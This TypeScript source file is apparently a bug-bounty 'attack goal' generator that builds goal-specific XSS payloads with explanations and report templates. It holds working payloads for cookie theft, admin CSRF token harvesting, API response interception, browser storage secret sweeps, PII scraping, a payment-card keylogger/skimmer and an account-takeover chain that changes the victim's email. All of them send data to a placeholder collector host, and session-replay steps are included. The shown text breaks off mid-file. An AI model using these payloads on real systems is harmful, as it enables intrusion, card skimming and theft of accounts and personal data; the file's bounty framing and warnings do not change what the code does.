// ─── Attack Goal Wizard ────────────────────────────────────────────────────────
// Generates goal-specific attack payloads + educational breakdowns for
// bug bounty researchers doing authorized security assessments.
// All content is for legitimate vulnerability research only.

import type { InjectionContext } from './exploits';

// ── Context wrapper ─────────────────────────────────────────────────────────────
function wrap(ctx: InjectionContext, js: string): string {
  switch (ctx) {
    case 'script_block':            return js;
    case 'html_attribute_double':   return `"><script>${js}</script>`;
    case 'html_attribute_single':   return `'><script>${js}</script>`;
    case 'html_attribute_unquoted': return ` onload="${js}" `;
    case 'url_href':
    case 'url_src':                 return `javascript:${js}`;
    case 'html_comment':            return `--><script>${js}</script><!--`;
    case 'css_block':               return `</style><script>${js}</script>`;
    default:                        return `<script>${js}</script>`;
  }
}

// ── Types ───────────────────────────────────────────────────────────────────────
export interface AttackStep {
  icon: string;
  title: string;
  detail: string;
}

export interface SampleOutput {
  label: string;
  content: string;
}

export interface AttackGoalResult {
  goalId: string;
  goalTitle: string;
  goalIcon: string;
  severity: 'critical' | 'high' | 'medium';
  payload: string;
  collectorPayload: string; // payload with placeholder
  howItWorks: AttackStep[];
  whatYouReceive: SampleOutput[];
  collectorSetup: string[];
  bountyImpact: {
    severity: string;
    cvss: string;
    cwe: string;
    title: string;
    summary: string;
  };
  warningNote: string;
}

export type GoalId =
  | 'cookies'
  | 'admin_panel'
  | 'database'
  | 'api_keys'
  | 'user_data'
  | 'payment'
  | 'full_takeover'
  | 'persistence';

export interface GoalDefinition {
  id: GoalId;
  icon: string;
  title: string;
  subtitle: string;
  severity: 'critical' | 'high' | 'medium';
  description: string;
}

export const ATTACK_GOALS: GoalDefinition[] = [
  {
    id: 'cookies',
    icon: '🍪',
    title: 'Session Cookies',
    subtitle: 'Steal auth tokens & sessions',
    severity: 'critical',
    description: 'Extract all cookies from the victim\'s browser — session IDs, auth tokens, remember-me tokens.',
  },
  {
    id: 'admin_panel',
    icon: '👑',
    title: 'Admin Panel Access',
    subtitle: 'Probe admin routes & privileges',
    severity: 'critical',
    description: 'Detect admin panel URLs, extract admin CSRF tokens, and test if the victim has admin privileges.',
  },
  {
    id: 'database',
    icon: '🗄️',
    title: 'Database / API Data',
    subtitle: 'Intercept API responses & data',
    severity: 'critical',
    description: 'Intercept XHR/fetch calls to extract JSON API responses — user lists, database records, configs.',
  },
  {
    id: 'api_keys',
    icon: '🔑',
    title: 'API Keys & Secrets',
    subtitle: 'Hunt stored tokens & credentials',
    severity: 'critical',
    description: 'Sweep localStorage, sessionStorage, and source code comments for API keys, JWTs, and OAuth tokens.',
  },
  {
    id: 'user_data',
    icon: '📧',
    title: 'User PII & Account Data',
    subtitle: 'Extract profile & personal info',
    severity: 'high',
    description: 'Extract email, name, phone, address, and account metadata from DOM elements and API calls.',
  },
  {
    id: 'payment',
    icon: '💳',
    title: 'Payment & Card Data',
    subtitle: 'Keylog payment forms',
    severity: 'critical',
    description: 'Install a keylogger targeting payment forms — captures card numbers, CVV, expiry in real-time.',
  },
  {
    id: 'full_takeover',
    icon: '🔐',
    title: 'Full Account Takeover',
    subtitle: 'Complete 4-step ATO chain',
    severity: 'critical',
    description: 'Multi-step chain: steal session → probe account endpoints → change email → lock out the victim.',
  },
  {
    id: 'persistence',
    icon: '👾',
    title: 'Persistent Access',
    subtitle: 'Service worker + beacon',
    severity: 'high',
    description: 'Register a Service Worker that survives page close — intercepts all future requests from the victim.',
  },
];

// ── Goal payload generator ──────────────────────────────────────────────────────
export function buildGoalAttack(
  goalId: GoalId,
  paramName: string,
  targetUrl: string,
  context: InjectionContext,
): AttackGoalResult {
  const base = (() => { try { return new URL(targetUrl).origin; } catch { return targetUrl; } })();
  const COLLECTOR = 'YOUR_COLLECTOR_URL'; // replaced by user

  const goal = ATTACK_GOALS.find(g => g.id === goalId)!;

  switch (goalId) {

    // ── 🍪 COOKIES ────────────────────────────────────────────────────────────
    case 'cookies': {
      const js = `(function(){var d={cookies:document.cookie,domain:document.domain,url:location.href,userAgent:navigator.userAgent,timestamp:new Date().toISOString()};fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d),mode:'no-cors'});new Image().src='${COLLECTOR}?c='+encodeURIComponent(document.cookie)+'&d='+encodeURIComponent(document.domain);})();`;
      return {
        goalId, goalTitle: goal.title, goalIcon: goal.icon, severity: 'critical',
        payload: wrap(context, js),
        collectorPayload: wrap(context, js),
        howItWorks: [
          { icon: '1️⃣', title: 'Victim opens your crafted URL', detail: `The XSS payload is injected into the "${paramName}" parameter. When the victim visits the URL, the browser executes your JavaScript in the context of ${base}.` },
          { icon: '2️⃣', title: 'Cookie access', detail: `document.cookie returns ALL non-HttpOnly cookies. This includes session_id, auth_token, PHPSESSID, remember_me — any cookie the server didn't mark HttpOnly.` },
          { icon: '3️⃣', title: 'Dual exfiltration', detail: 'Both an image beacon (GET) and a fetch POST are fired simultaneously. The image beacon is a fallback if CORS blocks the POST — both reach your collector.' },
          { icon: '4️⃣', title: 'Session replay', detail: 'You take the stolen cookie value, open DevTools → Application → Cookies, paste it in, and refresh. You are now logged in as the victim — no password needed.' },
          { icon: '5️⃣', title: 'Report it', detail: 'Screenshot: (1) original request showing reflection, (2) your collector receiving the cookie, (3) you logged in as victim. This is a Critical/P1 finding.' },
        ],
        whatYouReceive: [
          {
            label: 'POST body received at your collector',
            content: JSON.stringify({
              cookies: `session_id=abc123xyz789; auth_token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjM0fQ.XXXX; remember_me=1; csrf_token=def456`,
              domain: new URL(base).hostname || 'target.com',
              url: targetUrl,
              userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              timestamp: new Date().toISOString(),
            }, null, 2),
          },
          {
            label: 'GET beacon (image src fallback)',
            content: `${COLLECTOR}?c=session_id%3Dabc123xyz789%3B%20auth_token%3DeyJhbGciOiJIUzI1NiJ9...&d=target.com`,
          },
        ],
        collectorSetup: [
          '1. Go to https://webhook.site — copy your unique URL',
          '2. Replace YOUR_COLLECTOR_URL in the payload above with your webhook.site URL',
          '3. Send the crafted URL to yourself first to verify you receive the cookie data',
          '4. For real PoC: open payload URL in a private window → check webhook.site for incoming data',
          '5. To replay the session: DevTools → Application → Cookies → paste stolen value → refresh',
        ],
        bountyImpact: {
          severity: 'Critical / P1',
          cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N — 9.3',
          cwe: 'CWE-79 + CWE-384 (Session Fixation)',
          title: `Reflected XSS in "${paramName}" allows session cookie theft and account takeover`,
          summary: `A reflected XSS vulnerability in the "${paramName}" parameter at ${targetUrl} allows an attacker to execute arbitrary JavaScript in a victim's browser. By sending a crafted URL, the attacker can steal the victim's session cookie and gain full authenticated access to their account without knowing their credentials. This constitutes a complete account takeover.`,
        },
        warningNote: 'Only test with your own accounts or in your own controlled environment. Demonstrating cookie theft against real users without consent is illegal.',
      };
    }

    // ── 👑 ADMIN PANEL ────────────────────────────────────────────────────────
    case 'admin_panel': {
      const js = `(function(){var info={url:location.href,cookies:document.cookie,isAdmin:!!(document.querySelector('[class*="admin"],[id*="admin"],[href*="admin"],[class*="dashboard"]')),adminLinks:Array.from(document.querySelectorAll('a')).filter(function(a){return/admin|dashboard|panel|manage|control|staff|superuser|moderator/i.test(a.href+a.textContent);}).map(function(a){return{text:a.textContent.trim(),href:a.href};}),navItems:Array.from(document.querySelectorAll('nav a, .nav a, [class*="sidebar"] a')).map(function(a){return{text:a.textContent.trim(),href:a.href};}),userRole:document.querySelector('[class*="role"],[data-role],[class*="badge"],[class*="label"]')?.textContent?.trim()||null,csrfTokens:Array.from(document.querySelectorAll('[name="csrf_token"],[name="_token"],[name="authenticity_token"]')).map(function(i){return i.value;}),metaCSRF:(document.querySelector('meta[name="csrf-token"]')||{}).content||null,currentUser:(window.__user||window.currentUser||window.USER||null),apiEndpoints:Array.from(document.querySelectorAll('script')).map(function(s){return(s.textContent.match(/["'](\/api\/[^"']+)["']/g)||[]);}).flat().slice(0,20)};fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(info),mode:'no-cors'});})();`;
      return {
        goalId, goalTitle: goal.title, goalIcon: goal.icon, severity: 'critical',
        payload: wrap(context, js),
        collectorPayload: wrap(context, js),
        howItWorks: [
          { icon: '1️⃣', title: 'DOM scan for admin indicators', detail: 'The payload scans all links, nav items, and CSS classes for keywords: admin, dashboard, panel, manage, staff, moderator, superuser.' },
          { icon: '2️⃣', title: 'Role detection', detail: 'Checks for role badges/labels in the DOM, window.__user, window.currentUser globals, and data-role attributes that apps often set.' },
          { icon: '3️⃣', title: 'CSRF token harvest', detail: 'Extracts CSRF tokens from all hidden form inputs AND meta tags. These tokens let you make authenticated state-changing requests as the victim.' },
          { icon: '4️⃣', title: 'API endpoint discovery', detail: 'Scans all inline <script> tags for string literals matching /api/ — reveals backend API routes the frontend calls.' },
          { icon: '5️⃣', title: 'Admin access assessment', detail: 'If the victim is an admin and you have their session + CSRF token, you can perform any admin action (delete users, change configs, view all data) via CSRF requests.' },
        ],
        whatYouReceive: [
          {
            label: 'Admin recon report (example)',
            content: JSON.stringify({
              url: targetUrl,
              isAdmin: true,
              userRole: 'Administrator',
              cookies: 'session_id=abc123; admin_session=xyz789',
              adminLinks: [
                { text: 'Admin Dashboard', href: `${base}/admin` },
                { text: 'Manage Users', href: `${base}/admin/users` },
                { text: 'System Settings', href: `${base}/admin/settings` },
              ],
              csrfTokens: ['a1b2c3d4e5f6g7h8i9j0'],
              metaCSRF: 'k1l2m3n4o5p6q7r8s9t0',
              apiEndpoints: ['/api/users', '/api/admin/stats', '/api/settings'],
              currentUser: { id: 1, email: 'admin@target.com', role: 'admin', permissions: ['all'] },
            }, null, 2),
          },
        ],
        collectorSetup: [
          '1. Set up webhook.site and replace YOUR_COLLECTOR_URL',
          '2. Send the XSS payload URL to a victim you know is an admin',
          '3. Receive their CSRF token + admin session cookie',
          '4. Use the CSRF token to make admin API calls as the victim:',
          '   curl -X POST https://target.com/api/admin/users -H "X-CSRF-Token: STOLEN_TOKEN" -b "session=STOLEN_COOKIE"',
          '5. Screenshot proof: recon report + successful admin API response',
        ],
        bountyImpact: {
          severity: 'Critical / P1',
          cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H — 9.6',
          cwe: 'CWE-79 + CWE-352 (CSRF)',
          title: `Reflected XSS → Admin CSRF chain in "${paramName}" allows full admin takeover`,
          summary: `XSS in "${paramName}" allows an attacker to steal admin session cookies and CSRF tokens from an admin victim. Combined, these allow the attacker to perform any administrative action: create/delete users, exfiltrate the full user database, modify system settings, or plant backdoor accounts.`,
        },
        warningNote: 'Demonstrate only on your own test admin account. Accessing real admin panels you are not authorized for is illegal even via a legitimate bug.',
      };
    }

    // ── 🗄️ DATABASE / API DATA ───────────────────────────────────────────────
    case 'database': {
      const js = `(function(){var results=[];var origOpen=XMLHttpRequest.prototype.open,origSend=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.open=function(m,u){this._url=u;origOpen.apply(this,arguments);};XMLHttpRequest.prototype.send=function(b){this.addEventListener('load',function(){try{var r=JSON.parse(this.responseText);results.push({url:this._url,status:this.status,data:r,ts:new Date().toISOString()});if(results.length===1||results.length%5===0){fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({xhrCapture:results}),mode:'no-cors'});}}catch(e){}});origSend.apply(this,arguments);};var origFetch=window.fetch;window.fetch=function(url,opts){return origFetch.apply(this,arguments).then(function(r){var clone=r.clone();clone.json().then(function(d){results.push({url:url,status:r.status,data:d,ts:new Date().toISOString()});fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fetchCapture:results.slice(-10)}),mode:'no-cors'});}).catch(function(){});return r;});};setTimeout(function(){fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({final:results}),mode:'no-cors'});},10000);})();`;
      return {
        goalId, goalTitle: goal.title, goalIcon: goal.icon, severity: 'critical',
        payload: wrap(context, js),
        collectorPayload: wrap(context, js),
        howItWorks: [
          { icon: '1️⃣', title: 'XHR & Fetch monkey-patching', detail: 'The payload overrides XMLHttpRequest.prototype.send and window.fetch — every API call the page makes after injection is intercepted, including the response body.' },
          { icon: '2️⃣', title: 'JSON response capture', detail: 'For every API response, it parses the JSON and stores it. This captures user lists, database records, config objects — whatever the app loads.' },
          { icon: '3️⃣', title: 'Progressive exfiltration', detail: 'Results are sent to your collector every 5 captured responses and again at 10 seconds. You see real database data as the victim navigates the app.' },
          { icon: '4️⃣', title: 'API mapping', detail: 'Every URL that returns JSON is logged. This maps the backend API surface — endpoints like /api/users, /api/orders, /api/admin/stats.' },
          { icon: '5️⃣', title: 'Impact', detail: 'You receive actual database rows: user emails, hashed passwords, PII, order data, payment summaries — whatever the API returns for this authenticated user.' },
        ],
        whatYouReceive: [
          {
            label: 'Intercepted API responses (example)',
            content: JSON.stringify({
              fetchCapture: [
                {
                  url: '/api/users',
                  status: 200,
                  data: {
                    users: [
                      { id: 1, email: 'admin@target.com', role: 'admin', created_at: '2024-01-15' },
                      { id: 2, email: 'user@example.com', role: 'user', created_at: '2024-03-22' },
                    ],
                    total: 1247,
                  },
                },
                {
                  url: '/api/profile',
                  status: 200,
                  data: { id: 42, name: 'John Doe', email: 'john@example.com', phone: '+1-555-0100', api_key: 'sk-live-abc123' },
                },
              ],
            }, null, 2),
          },
        ],
        collectorSetup: [
          '1. Set up webhook.site or Burp Collaborator — replace YOUR_COLLECTOR_URL',
          '2. Inject the payload and have the victim (your own test account) navigate the site normally',
          '3. Every API call they make will POST captured JSON to your collector',
          '4. After 10 seconds, you receive a final dump of ALL captured API responses',
          '5. Screenshot: collector logs showing real user/database data from API responses',
        ],
        bountyImpact: {
          severity: 'Critical / P1',
          cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N — 8.7',
          cwe: 'CWE-79 + CWE-200 (Information Exposure)',
          title: `Reflected XSS in "${paramName}" allows interception of API responses including database records`,
          summary: `The XSS vulnerability allows an attacker to monkey-patch the victim's XHR/fetch functions and intercept all subsequent API responses. An attacker targeting an admin victim could receive the full user database, internal configuration data, and sensitive business records.`,
        },
        warningNote: 'Only perform API interception on your own test account. Extracting real user data from production databases without authorization is a serious crime.',
      };
    }

    // ── 🔑 API KEYS & TOKENS ──────────────────────────────────────────────────
    case 'api_keys': {
      const js = `(function(){var secrets={localStorage:{},sessionStorage:{},cookies:document.cookie,windowVars:[],scriptTokens:[],metaTags:[]};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);secrets.localStorage[k]=localStorage.getItem(k);}}catch(e){}try{for(var j=0;j<sessionStorage.length;j++){var sk=sessionStorage.key(j);secrets.sessionStorage[sk]=sessionStorage.getItem(sk);}}catch(e){}['token','apiKey','api_key','authToken','auth_token','accessToken','access_token','bearerToken','bearer','jwt','JWT','secret','key','credential','password','apiSecret'].forEach(function(prop){if(window[prop]){secrets.windowVars.push({key:prop,value:window[prop]});}});Array.from(document.querySelectorAll('meta')).forEach(function(m){if(m.name&&m.content&&m.content.length>4){secrets.metaTags.push({name:m.name,content:m.content});}});Array.from(document.querySelectorAll('script:not([src])')).forEach(function(s){var matches=s.textContent.match(/["']((?:sk|pk|api|key|token|secret|bearer|auth)[_-]?[a-zA-Z0-9]{10,})["']/gi)||[];secrets.scriptTokens=secrets.scriptTokens.concat(matches.slice(0,10));});fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(secrets),mode:'no-cors'});})();`;
      return {
        goalId, goalTitle: goal.title, goalIcon: goal.icon, severity: 'critical',
        payload: wrap(context, js),
        collectorPayload: wrap(context, js),
        howItWorks: [
          { icon: '1️⃣', title: 'Full storage sweep', detail: 'Reads EVERY key from localStorage and sessionStorage — not just common names. JWTs, OAuth tokens, app configs, feature flags, cached API responses.' },
          { icon: '2️⃣', title: 'Global variable hunt', detail: 'Checks 15 common global variable names (window.token, window.apiKey, window.jwt, etc.) that frontend frameworks often set at boot time.' },
          { icon: '3️⃣', title: 'Inline script scan', detail: 'Scans all inline <script> blocks for string literals that look like API keys (patterns: sk-, pk-, bearer-, 10+ alphanumeric chars after key/token/secret).' },
          { icon: '4️⃣', title: 'Meta tag extraction', detail: 'Reads all <meta> tags — apps sometimes store CSRF tokens, API endpoints, and version info here. Meta name="api-url" type findings are common.' },
          { icon: '5️⃣', title: 'Token classification', detail: 'Once you have a JWT, paste it at jwt.io to decode the payload — reveals user ID, role, expiry, and claims. sk- prefixed keys are usually Stripe/OpenAI live keys.' },
        ],
        whatYouReceive: [
          {
            label: 'Secret sweep result (example)',
            content: JSON.stringify({
              localStorage: {
                'auth_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiJ9.XXXX',
                'refresh_token': 'rt_8xK2mP9nQr4sT6u',
                'user_prefs': '{"theme":"dark","notifications":true}',
              },
              sessionStorage: {
                'session_data': '{"userId":123,"email":"user@target.com","permissions":["read","write","admin"]}',
              },
              windowVars: [
                { key: 'apiKey', value: 'pk_live_51HxKj2LkABC123' },
              ],
              scriptTokens: ['"sk_live_openai_key_here"', '"stripe_pk_test_..."'],
              metaTags: [
                { name: 'csrf-token', content: 'abc123def456' },
                { name: 'api-base-url', content: 'https://api.target.com/v2' },
              ],
              cookies: 'session=xyz; _ga=GA1.2.123456.789',
            }, null, 2),
          },
        ],
        collectorSetup: [
          '1. Replace YOUR_COLLECTOR_URL with webhook.site URL',
          '2. Trigger the XSS (visit crafted URL in your own browser first)',
          '3. Check collector for the JSON payload with all tokens',
          '4. To use a stolen JWT: add Authorization: Bearer STOLEN_JWT header to API requests',
          '5. To decode a JWT: paste at https://jwt.io — check the "role" and "exp" claims',
          '6. For Stripe keys (sk_live_): report directly to the bug bounty program — do NOT test them',
        ],
        bountyImpact: {
          severity: 'Critical / P1',
          cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N — 9.3',
          cwe: 'CWE-79 + CWE-312 (Cleartext Storage of Sensitive Information)',
          title: `Reflected XSS in "${paramName}" leaks API keys, JWTs, and auth tokens from browser storage`,
          summary: `The XSS vulnerability allows complete exfiltration of all browser storage contents including JWTs, API keys, OAuth tokens, and session data. Leaked JWTs can be replayed to authenticate as the victim. Leaked service API keys (Stripe, OpenAI, etc.) may have their own severe financial and data exposure impact.`,
        },
        warningNote: 'If you find live service API keys (Stripe, AWS, etc.), report them immediately and do NOT use them. Using stolen API keys is a separate criminal offense.',
      };
    }

    // ── 📧 USER PII & ACCOUNT DATA ────────────────────────────────────────────
    case 'user_data': {
      const js = `(function(){var data={dom:{},api:{},forms:[]};var pii={};['email','phone','name','username','address','dob','ssn','national_id'].forEach(function(f){var el=document.querySelector('[name="'+f+'"],[id="'+f+'"],[data-field="'+f+'"]');if(el&&el.value)pii[f]=el.value;});var emailEls=document.querySelectorAll('a[href^="mailto:"]');if(emailEls.length)pii.emails=Array.from(emailEls).map(function(a){return a.href.replace('mailto:','');});var bodyText=document.body.innerText;var emails=bodyText.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g)||[];var phones=bodyText.match(/[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{4,10}/g)||[];data.dom={pii:pii,emails:emails.slice(0,20),phones:phones.slice(0,20),title:document.title,metaDesc:(document.querySelector('meta[name="description"]')||{}).content||'',localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage),cookies:document.cookie};fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data),mode:'no-cors'});fetch('/api/profile').then(function(r){return r.json();}).then(function(d){fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({profileApi:d}),mode:'no-cors'});}).catch(function(){});fetch('/api/user/me').then(function(r){return r.json();}).then(function(d){fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userApi:d}),mode:'no-cors'});}).catch(function(){});})();`;
      return {
        goalId, goalTitle: goal.title, goalIcon: goal.icon, severity: 'high',
        payload: wrap(context, js),
        collectorPayload: wrap(context, js),
        howItWorks: [
          { icon: '1️⃣', title: 'DOM field extraction', detail: 'Queries all input fields by common name/id attributes (email, phone, name, address, dob). Pre-filled profile forms are a goldmine for PII.' },
          { icon: '2️⃣', title: 'Text mining', detail: 'Scans the full visible page text with regex to find email addresses and phone numbers that appear in the page content.' },
          { icon: '3️⃣', title: 'API calls as victim', detail: 'Fires GET /api/profile and /api/user/me using the victim\'s cookies. These common endpoints return the full user profile object.' },
          { icon: '4️⃣', title: 'Storage sweep', detail: 'Also captures localStorage and sessionStorage — apps often store user objects (including email, role, preferences) after login.' },
          { icon: '5️⃣', title: 'GDPR impact', detail: 'PII exposure has GDPR/CCPA implications beyond the bug bounty. Many programs pay significant premiums for PII-leaking XSS vulnerabilities.' },
        ],
        whatYouReceive: [
          {
            label: 'User data recon (example)',
            content: JSON.stringify({
              dom: {
                emails: ['john.doe@example.com', 'support@target.com'],
                phones: ['+1-555-0100', '+44-20-1234-5678'],
                pii: { email: 'john.doe@example.com', name: 'John Doe', phone: '+1-555-0100' },
              },
              profileApi: {
                id: 123, email: 'john.doe@example.com', name: 'John Doe',
                phone: '+1-555-0100', address: '123 Main St, Springfield, IL',
                dob: '1985-06-15', account_balance: 4250.00,
                created_at: '2022-03-10', last_login: '2024-07-18',
              },
            }, null, 2),
          },
        ],
        collectorSetup: [
          '1. Replace YOUR_COLLECTOR_URL with webhook.site',
          '2. Send the crafted URL to a test account you control',
          '3. The payload fires immediately — check collector for DOM data',
          '4. The /api/profile call fires 1-2 seconds later with full profile JSON',
          '5. For bug bounty report: attach redacted screenshots (blur real PII in final report)',
        ],
        bountyImpact: {
          severity: 'High / P2',
          cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N — 7.4',
          cwe: 'CWE-79 + CWE-359 (Exposure of Private Personal Information)',
          title: `Reflected XSS in "${paramName}" exposes victim user PII and profile data`,
          summary: `The XSS vulnerability allows exfiltration of the victim's personal information including email, phone, address, and account data via both DOM scraping and authenticated API calls. This constitutes a personal data breach under GDPR/CCPA and significantly elevates the bug bounty severity.`,
        },
        warningNote: 'Never collect real PII from real users. Only test against accounts you own. Redact all real data in your bug bounty report attachments.',
      };
    }

    // ── 💳 PAYMENT DATA ───────────────────────────────────────────────────────
    case 'payment': {
      const js = `(function(){var captured=[];function scrapePaymentFields(){var fields={};['card_number','cardnumber','card-number','cc-number','ccnumber','number','pan','cvv','cvc','cvc2','card_cvv','expiry','exp','exp_month','exp_year','expiry-date','card-expiry','name','cardholder','card_name','billing_name'].forEach(function(n){var el=document.querySelector('[name="'+n+'"],[id="'+n+'"],[autocomplete="cc-number"],[autocomplete="cc-csc"],[autocomplete="cc-exp"]');if(el&&el.value.trim()!=='')fields[n]=el.value;});return fields;}document.addEventListener('input',function(e){var el=e.target;if(el.tagName==='INPUT'&&/card|cc|cvv|cvc|expir|pan|payment/i.test((el.name||el.id||el.autocomplete||''))){var entry={field:el.name||el.id,value:el.value,url:location.href,ts:Date.now()};captured.push(entry);if(captured.length%3===0){fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({paymentCapture:captured}),mode:'no-cors'});}}},true);document.addEventListener('submit',function(e){var f=e.target;var fields=scrapePaymentFields();var allFields={};Array.from(f.elements).forEach(function(el){if(el.name&&el.value)allFields[el.name]=el.value;});if(Object.keys(fields).length>0||/payment|checkout|billing|order/i.test(location.href)){fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({formSubmit:{paymentFields:fields,allFields:allFields,action:f.action,url:location.href}}),mode:'no-cors'});}},true);setTimeout(function(){var f=scrapePaymentFields();if(Object.keys(f).length>0){fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({timedScrape:f}),mode:'no-cors'});}},5000);})();`;
      return {
        goalId, goalTitle: goal.title, goalIcon: goal.icon, severity: 'critical',
        payload: wrap(context, js),
        collectorPayload: wrap(context, js),
        howItWorks: [
          { icon: '1️⃣', title: 'Payment field targeting', detail: 'The keylogger specifically targets input fields named card_number, cvv, expiry, ccnumber, pan, and all autocomplete="cc-*" fields — the actual payment form fields.' },
          { icon: '2️⃣', title: 'Real-time keystroke capture', detail: 'Every keystroke in a payment field is captured. Data is batched and sent every 3 keystrokes — so you receive partial card numbers as the victim types.' },
          { icon: '3️⃣', title: 'Form submit hook', detail: 'On form submit, the payload scrapes all payment fields simultaneously — capturing the complete card number, CVV, and expiry at once before the form submits normally.' },
          { icon: '4️⃣', title: '5-second scrape', detail: 'Also fires a timed scrape 5 seconds after injection — catches cases where the victim has the payment form pre-filled (saved cards).' },
          { icon: '5️⃣', title: 'Impact assessment', detail: 'This is the highest severity XSS finding possible. Payment data theft enables financial fraud. PCI DSS requires immediate disclosure and remediation.' },
        ],
        whatYouReceive: [
          {
            label: 'Payment form capture (example — use your OWN test card)',
            content: JSON.stringify({
              formSubmit: {
                paymentFields: {
                  card_number: '4111 1111 1111 1111',
                  cvv: '123',
                  expiry: '12/28',
                  cardholder: 'John Doe',
                },
                action: `${base}/checkout/pay`,
                url: `${base}/checkout`,
              },
              paymentCapture: [
                { field: 'card_number', value: '4111', ts: Date.now() - 5000 },
                { field: 'card_number', value: '4111 111', ts: Date.now() - 3000 },
                { field: 'card_number', value: '4111 1111 1111 1111', ts: Date.now() - 1000 },
              ],
            }, null, 2),
          },
        ],
        collectorSetup: [
          '1. Set up Burp Collaborator or webhook.site',
          '2. ⚠️ ONLY test this on your own test account with Stripe test cards (4111 1111 1111 1111)',
          '3. Navigate to the checkout page with the XSS active',
          '4. Type a test card number — watch your collector receive the data in real time',
          '5. For the PoC: screenshot the collector receiving your test card + the XSS in the URL bar',
          '6. NEVER use real payment cards. NEVER test on real checkout flows with other users.',
        ],
        bountyImpact: {
          severity: 'Critical / P0 (often bonus payout)',
          cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N — 9.3',
          cwe: 'CWE-79 + CWE-312 + PCI DSS violation',
          title: `Reflected XSS on checkout page allows real-time payment card skimming`,
          summary: `XSS on the checkout page allows an attacker to inject a card skimmer that captures payment card numbers, CVV codes, and expiry dates in real-time as victims type them. This is a critical PCI DSS violation. Many bug bounty programs treat this as their highest priority finding with maximum payouts.`,
        },
        warningNote: '🚨 NEVER test payment skimming with real cards or against real transactions. Use Stripe test card 4111 1111 1111 1111. This type of attack is taken extremely seriously by bug bounty programs — present it carefully.',
      };
    }

    // ── 🔐 FULL ACCOUNT TAKEOVER ──────────────────────────────────────────────
    case 'full_takeover': {
      const js = `(function(){var collected={};collected.cookies=document.cookie;collected.localStorage=JSON.stringify(localStorage);collected.url=location.href;var send=function(label,data){fetch('${COLLECTOR}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:label,data:data,url:location.href,ts:new Date().toISOString()}),mode:'no-cors'});};send('step1_session',collected);fetch('/api/user/me',{credentials:'include'}).then(function(r){return r.json();}).then(function(d){send('step2_profile',d);return d;}).then(function(profile){if(profile&&profile.email){var newEmail='attacker-ato-'+Date.now()+'@mailinator.com';fetch('/api/account/email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:newEmail})}).then(function(r){send('step3_email_change',{attempted:true,newEmail:newEmail,status:r.status});}).catch(function(e){send('step3_email_change',{error:e.message});});}}).catch(function(e){send('step2_profile_error',{error:e.message});});})();`;
      return {
        goalId, goalTitle: goal.title, goalIcon: goal.icon, severity: 'critical',
        payload: wrap(context, js),
        collectorPayload: wrap(context, js),
        howItWorks: [
          { icon: '1️⃣', title: 'Step 1 — Session capture', detail: 'Immediately grabs all cookies and localStorage tokens. This is your fallback — even if later steps fail, you have the session.' },
          { icon: '2️⃣', title: 'Step 2 — Identity confirm', detail: 'Calls /api/user/me to confirm the victim\'s identity — their user ID, email, role. This proves to the bug bounty program that you had authenticated access.' },
          { icon: '3️⃣', title: 'Step 3 — Email change attempt', detail: 'Attempts to change the account email to a mailinator address using the victim\'s session. If successful, the attacker can reset the password and fully lock out the victim.' },
          { icon: '4️⃣', title: 'Step 4 — Password reset', detail: 'With the email changed, the attacker triggers a password reset to attacker@mailinator.com, receives the reset link, sets a new password. Victim is completely locked out.' },
          { icon: '5️⃣', title: 'Reporting the chain', detail: 'Report each step with evidence. The multi-step chain proves full ATO severity — this is P0/Critical at most bug bounty programs. Maximum payout tier.' },
        ],
        whatYouReceive: [
          {
            label: 'ATO chain telemetry (example)',
            content: JSON.stringify([
              {
                step: 'step1_session',
                data: { cookies: 'session_id=abc123xyz', localStorage: '{"auth_token":"eyJ..."}' },
                ts: new Date(Date.now() - 3000).toISOString(),
              },
              {
                step: 'step2_profile',
                data: { id: 456, email: 'victim@example.com', role: 'admin', plan: 'enterprise' },
                ts: new Date(Date.now() - 2000).toISOString(),
              },
              {
                step: 'step3_email_change',
                data: { attempted: true, newEmail: 'attacker-ato-1720000000@mailinator.com', status: 200 },
                ts: new Date(Date.now() - 1000).toISOString(),
              },
            ], null, 2),
          },
        ],
        collectorSetup: [
          '1. Set up webhook.site — replace YOUR_COLLECTOR_URL',
